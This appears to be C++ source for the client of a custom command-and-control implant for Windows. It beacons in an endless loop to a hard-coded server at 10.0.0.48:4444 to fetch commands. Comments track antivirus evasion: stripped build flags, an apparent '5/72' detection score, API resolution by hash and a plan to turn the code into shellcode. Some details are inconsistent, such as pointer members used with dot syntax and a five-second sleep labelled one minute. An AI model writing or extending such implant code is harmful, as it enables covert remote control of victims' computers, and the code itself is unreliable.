/* TODO:
 * x86_64-w64-mingw32-gcc -nostdlib -nostartfiles -s -Wl,--entry=main -Wl,--strip-all client.c -o client.exe
 * 
 * // Working flags below, 5/72
 * x86_64-w64-mingw32-gcc -s -Wl,--entry=main -Wl,--strip-all client.c -o client.exe 
 * */

// TODO: eventually convert to c code then asm then shell code?

//#include "stager.h"


#include "Client.h"
#include "TransportLayer.h"



/*
Client::Client() : 
	transportLayer_(messageHandler_, "10.0.0.48", "4444") // Default server address
{
	messageHandler_.setTransportLayer(transportLayer_);
}

Client::Client(TCPtransportLayer transportLayer, std::string server, std::string port) : // TODO: transporter parameter isn't used 
	transportLayer_(messageHandler_, server, port)
{
	messageHandler_.setTransportLayer(transportLayer_);
}*/


Client::Client() : 
	transportLayer_(TransportLayerFactory::create(
		TransportLayerType::TCP,
		messageHandler_,
		"10.0.0.48",
		"4444"))
{
	messageHandler_.setTransportLayer(*transportLayer_);
}

// Constructor with specific transport type
Client::Client(TransportLayerType transportType, const std::string& server, const std::string& port) :
	transportLayer_(TransportLayerFactory::create(transportType, messageHandler_, server, port))
{
	messageHandler_.setTransportLayer(*transportLayer_);
}

// Constructor with custom transporter (for testing)
Client::Client(TransportLayerUniquePtr transporter) :
	transportLayer_(std::move(transporter))
{
	messageHandler_.setTransportLayer(*transportLayer_);
}




bool Client::run()
{	
	//Config* config = loadConfig();
	//Config config = loadConfig();

	// 1. manually resolve apis
	/*
	TODO:
	would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have
	to loop through the array of functions every single time?

	something like this:
	resolve_all_functions(dll_base, hashes, pointers, count);

	not sure if this is worth doing for dlls/modules tho

	*/


	while (true)
	{
		if (!transportLayer_.isConnected())
		{
			transportLayer_.connect();    // Try to connect (handles if already connected)
		}
		transportLayer_.beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
		//transporter_.receive();
		//transporter_.sendMessage();
		Sleep(5000);            // Wait 1 minute
	}
	return false;
}
